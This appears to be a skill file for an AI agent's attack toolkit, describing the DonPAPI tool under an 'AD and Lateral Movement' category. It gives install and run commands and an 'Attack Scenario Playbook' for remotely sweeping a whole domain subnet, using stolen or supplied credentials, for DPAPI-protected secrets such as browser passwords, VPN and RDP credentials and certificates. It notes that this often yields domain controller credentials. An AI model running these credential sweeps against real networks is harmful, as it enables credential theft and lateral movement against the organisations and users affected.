---
name: donpapi-dpapi-harvest
description: "DonPAPI: domain-wide DPAPI credential sweep. Signals: AD attack, domain penetration, single-host triage, connectivity test, output directory."
zh-signals: "DonPAPI: 域内 DPAPI 凭据大扫荡。信号:ad攻击,域渗透,单机 triage,连通性测试,输出目录。"
when-to-use: "Use to remotely harvest DPAPI-protected secrets such as browser passwords, VPN, RDP, and certificates across a domain."
---

# DonPAPI

- Attack Category: C30 AD and Lateral Movement
- Upstream Repository: https://github.com/login-securite/DonPAPI
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install donpapi
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24` | Bulk harvest of DPAPI secrets |
| `donpapi triage -t 10.0.0.5` | Single-host triage |
| `donpapi test -t 10.0.0.5` | Connectivity test |
| `-o out/` | Output directory |

## Attack Scenario Playbook

### Domain-wide DPAPI credential sweep

```bash
donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24
# Harvests saved browser passwords/Wi-Fi/VNC/certificates, often yielding domain controller credentials
```

## Notes

From login-securite; remotely harvests secrets protected by Windows DPAPI (browser passwords, VPN, RDP credentials, and more) in bulk.
